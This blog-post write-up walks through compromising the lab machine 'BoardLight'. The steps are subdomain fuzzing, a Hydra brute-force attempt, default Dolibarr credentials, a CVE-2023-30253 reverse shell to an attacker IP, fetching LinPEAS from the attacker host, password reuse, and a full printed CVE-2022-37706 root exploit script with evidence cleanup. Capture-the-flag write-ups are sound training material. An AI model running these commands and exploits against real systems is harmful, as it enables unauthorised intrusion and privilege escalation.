---
layout: post
title: "BoardLight"
date: 2025-09-11 00:00:00 -0400
author: Hugo Beaulieu
categories: linux machine
tags: linux dolibarr cve-2023-30253 enlightenment cve-2022-37706 subdomain-enumeration password-reuse
---

## Overview

BoardLight is a Linux machine running a Dolibarr CRM application vulnerable to CVE-2023-30253. The exploitation involves subdomain enumeration to discover a hidden CRM interface, gaining access with default credentials, achieving remote code execution through PHP injection in website pages, lateral movement via password reuse, and privilege escalation through CVE-2022-37706 in the Enlightenment desktop environment's SUID binaries.

## Initial Enumeration

### Nmap Scan

We start with an nmap scan to identify open ports and services:

```bash
nmap -sV -v 10.129.52.52
```

Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open: SSH on port 22 and HTTP on port 80.

### Directory Enumeration

Since there's an Apache web server running, we scan for directories:

```bash
dirb http://10.129.52.52/
```

The `/server-status` page appears in the results, but we don't have permission to access it.

### Web Application Analysis

Accessing `http://10.129.52.52/`, we discover a PHP-based website. Several links (including the login) don't appear to be functional.

When submitting forms, no POST requests appear in the network traffic. Examining the HTML source reveals:

```html
<form action="">....</form>
```

The `action` field is empty, explaining why forms don't work.

Attempting to access non-existent pages like `/login.php` returns `File not found.` We try directory traversal to access `/etc/passwd`, but the URL is corrected and we receive `The requested URL was not found on this server.`

Additional observations:
- No cookies are visible
- jQuery version 3.4.1 has no known vulnerabilities
- A commented `portfolio.php` file exists in the source, but accessing it returns `File not found`

### Nikto Scan

Running nikto reveals some details but nothing immediately exploitable:

```bash
nikto -h http://10.129.52.52/

+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54).
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ 8074 requests: 0 error(s) and 4 item(s) reported on remote host
```

## Subdomain Discovery

With limited progress on the main site, we turn to subdomain enumeration using ffuf:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

Success! We discover a subdomain:

```json
{
  "commandline": "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H Host: FUZZ.board.htb -mc 200 -fs 15949 -o ffuf_output.txt -of json",
  "time": "2024-07-26T17:05:30-05:00",
  "results": [
    {
      "input": {
        "FFUFHASH": "6790a48",
        "FUZZ": "crm"
      },
      "position": 72,
      "status": 200,
      "length": 6360,
      "words": 397,
      "lines": 150,
      "content-type": "text/html; charset=UTF-8",
      "redirectlocation": "",
      "scraper": {},
      "duration": 93789337,
      "resultfile": "",
      "url": "http://board.htb",
      "host": "crm.board.htb"
    }
  ],
  ....
}
```

We've found the host `crm.board.htb`!

### Dolibarr CRM Discovery

Accessing the subdomain, we find a login page for **Dolibarr 17.0.0** CRM. Researching on exploit-db.com, we find that version 17.0.1 is vulnerable to XSS attacks, which may be useful later.

### Attempting Brute Force with Hydra

With this information, we attempt a login attack using Hydra. First, we intercept a login request with Burp Suite:

```bash
token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-3T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=test
```

The response for bad credentials is `Bad value for login or password`.

We launch Hydra:

```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -t 16 -o hydra_results.txt http-post-form://crm.board.htb/index.php?mainmenu=home:"token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-03T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=^USER^&password=^PASS^:F=Bad"
```

However, we quickly realize a unique cookie is generated as brute-force protection for each session, as we receive the response: `Security token has expired, so action has been canceled. Please try again.`

### Subdomain Enumeration

We also scan directories on the new subdomain with dirb:

```bash
dirb http://crm.board.htb/
```

We find several interesting files:

**http://crm.board.htb/conf**

```html
Forbidden You don't have permission to access this resource.
```

**http://crm.board.htb/api/index.php**

```bash
Module Api must be enabled.

To activate modules, go on setup Area (Home->Setup->Modules).
```

**http://crm.board.htb/install/phpinfo.php**

```bash
The application tried to self-upgrade, but the install/upgrade pages have been disabled for security (by the existence of a lock file install.lock in the dolibarr documents directory).
If an upgrade is in progress, please wait. If not, click on the following link. If you always see this same page, you must remove/rename the file install.lock in the documents directory.
Click here to go to your application
```

The page in the `public` directory redirects to a 404 error, and other pages require login.

## CVE-2023-30253 Exploitation

### Finding the Vulnerability

Researching online, we find CVE-2023-30253 which allows obtaining a reverse shell on Dolibarr 17.0.0, but it requires valid credentials:

- https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
- https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253

The exploit works by:
1. Authenticating to Dolibarr
2. Creating a new website
3. Creating a new page within that website
4. Injecting PHP code into the page content
5. Triggering the PHP execution to get a reverse shell

### Default Credentials

With limited options, we try popular default credentials and finally discover that `admin` / `admin` works!

### Getting a Reverse Shell

Now that we have credentials, we can execute the CVE to obtain a reverse shell. First, we start netcat:

```bash
nc -lvnp 9001
```

Then we run the exploit script:

```bash
python3 exploit.py http://crm.board.htb admin admin 10.10.14.252 9001
```

A connection is established with netcat:

```bash
listening on [any] 9001 ...
connect to [10.10.14.252] from (UNKNOWN) [10.129.52.52] 43820
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```

Success! We have a shell as `www-data`.

## Initial Reconnaissance

We perform some basic reconnaissance:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls
ls
index.php
styles.css.php
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cd ..
cd ..
www-data@boardlight:~/html/crm.board.htb/htdocs/public$ cd /home
cd /home
www-data@boardlight:/home$ ls
ls
larissa
www-data@boardlight:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 May 17 01:04 .
drwxr-xr-x 19 root    root    4096 May 17 01:04 ..
drwxr-x--- 15 larissa larissa 4096 May 17 01:04 larissa
```

We need to find a way to become the user `larissa`.

## Privilege Escalation to Larissa

### LinPEAS Enumeration

We use LinPEAS to find privilege escalation vulnerabilities. To transfer it to the machine, we download the script on our machine and serve it:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```

From the target server, we download LinPEAS:

```bash
cd /tmp
wget 10.10.14.252:8080/linpeas.sh
chmod +x linpeas.sh
```

Then execute it:

```bash
./linpeas.sh
....
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 May 13 23:40 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 4 www-data www-data 4096 Mar  4  2023 /var/www/html/crm.board.htb/.github

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 19 07:35 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Mar 19 07:35 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 27 Sep 17  2023 /etc/apache2/sites-enabled/php.conf -> ../sites-available/php.conf
lrwxrwxrwx 1 root root 28 Sep 17  2023 /etc/apache2/sites-enabled/site.conf -> ../sites-available/site.conf
lrwxrwxrwx 1 root root 32 Mar 19 07:35 /etc/apache2/sites-enabled/dolibarr.conf -> ../sites-available/dolibarr.conf
lrwxrwxrwx 1 root root 29 Mar 19 00:29 /etc/apache2/sites-enabled/board.conf -> ../sites-available/board.conf

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6 04:49 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9 08:34 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6 04:49 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9 08:34 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6 04:49 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6 04:49 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6 04:49 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root mail 23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root mail 15K Aug 26  2019 /usr/bin/mlock
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Feb  6 04:49 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 83K Feb  6 04:49 /usr/bin/chage
-rwxr-sr-x 1 root ssh 343K Jan  2  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write

╔══════════╣ Analyzing SSH Files (limit 70)
-rw-r--r-- 1 root root 177 May  2 05:43 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 97 May  2 05:43 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 569 May  2 05:43 /etc/ssh/ssh_host_rsa_key.pub

Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes

```

Key findings:
- Nothing interesting in cronjobs
- There's a MySQL database
- Root can connect via SSH

### Discovering Credentials

Consulting the Dolibarr documentation on GitHub, we note that the `htdocs/conf/conf.php` file might contain sensitive values. We display it:

```bash
www-data@boardlight:~/html/crm.board.htb$ cat htdocs/conf/conf.php
cat htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='[REDACTED]';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
www-data@boardlight:~/html/crm.board.htb$ su larissa
su larissa
Password: [REDACTED]
whoami
larissa
```

We find a database password: `$dolibarr_main_db_pass='[REDACTED]';`

By reusing the same password, we're able to connect as larissa!

### User Flag

Once logged in as larissa, we can retrieve the user flag:

```bash
cd /home/larissa
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
user.txt
Videos
cat user.txt
[REDACTED]
```

## Privilege Escalation to Root

### Finding Enlightenment SUID Binaries

Rescanning with LinPEAS, we find the following SUID binaries:

```bash
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

We notice the name seems similar to the box name (boardlight/enlightenment). After some research, we discover these files are related to the [Enlightenment desktop environment](https://www.enlightenment.org/).

### CVE-2022-37706 Exploitation

We find the following CVE on exploit-db.com: https://www.exploit-db.com/exploits/51180

```bash
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
```

We execute the CVE, but initially without success due to line breaks in the original exploit:

```bash
larissa@boardlight:~$ ./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Welcome to the rabbit hole :)
./exploit.sh: line 28: noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=1000,: command not found
./exploit.sh: line 29: /dev/../tmp/;/tmp/exploit: Is a directory
Press any key to clean the evedence...
```

We retry after modifying the command at lines 28 and 29 to put them on the same line:

```bash
larissa@boardlight:~$ ./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Welcome to the rabbit hole :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

Success! We have a root shell.

### Root Flag

Once logged in as root, we retrieve the flag:

```bash
# cd /root
# ls
root.txt  snap
# cat root.txt
[REDACTED]
```

## Key Takeaways

- **Subdomain enumeration** is essential when main websites yield limited results
- **Default credentials** (admin/admin) should always be tested on enterprise applications
- **CVE-2023-30253** in Dolibarr 17.0.0 allows authenticated PHP code injection via website pages
- **Configuration files** often contain hardcoded database passwords
- **Password reuse** across services is common and should always be tested
- **SUID binaries** related to desktop environments can provide unexpected privilege escalation paths
- **CVE-2022-37706** in Enlightenment allows privilege escalation through mount manipulation
- **Exploit modifications** may be necessary when line breaks cause syntax errors
